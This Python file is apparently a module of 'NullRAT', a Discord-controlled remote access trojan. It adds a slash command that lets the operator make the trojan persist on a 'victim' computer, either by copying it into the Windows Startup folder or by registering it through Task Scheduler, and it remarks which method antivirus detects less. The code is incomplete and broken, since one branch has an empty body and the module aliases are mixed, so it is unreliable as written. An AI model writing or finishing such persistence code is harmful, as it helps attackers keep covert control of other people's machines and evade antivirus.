import disnake as discord
from disnake.ext import commands
from datetime import datetime
from sys import executable

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

global method

class Startup(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Add NullRAT to startup directory",
        options=[bot.victim],
    )
    async def startup(self, ctx, victim):
        if str(victim) == str(self.ip_addr):
            view = Confirm()
            await ctx.followup.send(
                embed = self.bot.genEmbed(
                    "Choose method for starting up",
                    datetime.now()
                ).add_field(
                    name = "Method 1: shell:startup",
                    value = """```
LEGACY METHOD, NO ADMIN REQUIRED

Copies the rat to "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" so that it can be started every time PC is turned on.
This method is detected by antiviruses, and has a chance to not work. However it needs no admin unlike the other method.```""",
                    inline = False
                ).add_field(
                    name = "Method 2: schtasks",
                    value = """```
MODERN METHOD, REQUIRES ADMIN ACCESS

Copies rat to cache folder, and adds the exe path to startup via Task Scheduler.
This method is less detected by antiviruses, but requires admin access to be granted. If not provided, the program will ask for admin.```""",
                    inline = False
                ),
                
                view = view
            )
            
            await view.wait()
            if view.legacy is None:
                await ctx.channel.send("Timeout")
            if view.legacy:
                
                
class Confirm(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.legacy = None

    @disnake.ui.button(label="shell:startup", style=discord.ButtonStyle.grey)
    async def confirm(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        await interaction.response.send_message("Using legacy method...")
        self.legacy = True
        self.stop()

    @disnake.ui.button(label="schtasks", style=discord.ButtonStyle.grey)
    async def cancel(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        await interaction.response.send_message("Using modern method...")
        self.legacy = False
        self.stop()

def setup(bot: commands.Bot):
    bot.add_cog(Startup(bot))